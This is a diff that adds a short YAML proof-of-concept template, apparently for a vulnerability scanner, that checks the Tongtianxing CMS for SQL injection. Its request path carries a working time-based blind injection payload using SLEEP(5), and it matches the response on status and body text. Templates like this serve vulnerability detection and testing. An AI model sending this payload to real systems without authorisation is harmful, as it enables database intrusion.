@@ -1,0 +1,10 @@
+name: poc-yaml-通天星CMS-sql
+description: "SQL注入"
+method: GET
+path:
+  - "/run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1"
+expression:
+  status: 200
+  body_all:
+    - "message"
+    - "OK"
